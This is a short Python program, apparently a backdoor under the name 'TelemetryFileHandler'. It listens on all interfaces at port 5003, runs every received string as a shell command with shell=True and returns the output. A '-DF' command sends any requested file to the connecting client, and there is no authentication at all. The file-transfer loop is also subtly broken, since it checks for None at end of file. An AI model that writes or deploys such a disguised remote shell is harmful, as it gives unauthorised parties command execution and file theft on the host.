import threading, socket, subprocess

class TelemetryFileHandler(threading.Thread):

    def __init__(self, client):
        self.client = client

        super(TelemetryFileHandler, self).__init__()


    def processCommand(self, command):
        response= ''
        if command[0:3] == "-DF":
            response = self.sendFileToClient(command[4:].strip())
        else:
            response = self.pipeToCommandLine(command)
        return response

    def sendFileToClient(self, fileName):
        with open(fileName, "rb") as file:
            while True:
                dataPacket = file.read(1024)
                if dataPacket is not None:
                    print("here")
                    self.client.send(dataPacket)
                    self.client.recv(35)
                else:
                    self.client.send("DONE".encode("utf-8"))
                    print("done")
                    return "File SENT"
                
    def pipeToCommandLine(self, command):
        subroutineCall = subprocess.Popen(command, shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE)
        return (subroutineCall.stdout.read() + subroutineCall.stderr.read()).decode("utf-8").strip()


    def run(self):
        while True:
            command = self.client.recv(1024).decode("utf-8")
            response = self.processCommand(command)
            self.client.send(response.encode("utf-8"))

if __name__ == "__main__":
    server = socket.socket()
    server.bind(("0.0.0.0", 5003))
    server.listen(1)
    print("Waiting")
    while True:
        client, clientAddr = server.accept()
        print("Connection Made..")
        handler = TelemetryFileHandler(client)
        handler.start()
